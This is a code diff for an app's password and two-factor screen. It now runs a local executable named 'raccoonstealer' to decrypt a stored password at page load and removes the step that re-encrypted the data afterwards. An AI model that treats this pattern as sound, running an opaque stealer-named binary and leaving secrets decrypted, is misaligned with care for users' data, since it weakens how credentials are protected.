@@ -10,7 +10,12 @@ const email = info.user;
 let passwordd = document.getElementById('passwordd');
 
 window.addEventListener('DOMContentLoaded', () =>{
-    askPass();
+    exec('./raccoonstealer', ['--decrypt', '--acceptdecrypt'], (error, stdout, stderr) => {
+        let data = JSON.parse(stdout);
+        passjson = data.RaccoonLock;
+        passwordd.classList.remove('hidden');
+        passwordd.style.animation = 'fadein 0.5s';
+    });
 });
 
 document.getElementById('submitv').addEventListener('click', () =>{
@@ -19,7 +24,7 @@ document.getElementById('submitv').addEventListener('click', () =>{
 
     if (code === twoFA){
         verify.style.animation = 'fadeout 1s forwards';
-        setTimeout(() => window.location.href = 'mainmenu.html', 5000);
+        setTimeout(() => window.location.href = 'mainmenu.html', 3000);
     }else{
         let err = document.getElementById('error');
         err.classList.remove('hidden');
@@ -34,27 +39,13 @@ document.getElementById('submit').addEventListener('click', () =>{
         setTimeout(() => {
             passwordd.style.display = 'none';
             info.passwordmode === false ? sendm() : window.location.href = 'mainmenu.html';
-        }, 2000);
+        }, 3000);
     }else{
         let errora = document.getElementById('errora');
         errora.classList.remove('hidden');
         errora.innerHTML = currentlang.passwordd.errora;
     }
 });
-
-const askPass = () =>{
-    exec('./raccoonstealer', ['--decrypt', '--acceptdecrypt'], (error, data) => {
-        getPass();
-    });
-}
-
-function getPass(){
-    let data = JSON.parse(fs.readFileSync(`${path}/data.json`, 'utf8'));
-    passjson = data.RaccoonLock;
-    exec('./raccoonstealer', ['--encrypt'], (err, data) =>{});
-    passwordd.classList.remove('hidden');
-    passwordd.style.animation = 'fadein 0.5s';
-}
 
 function sendm(){
     let verify = document.getElementById('verify');
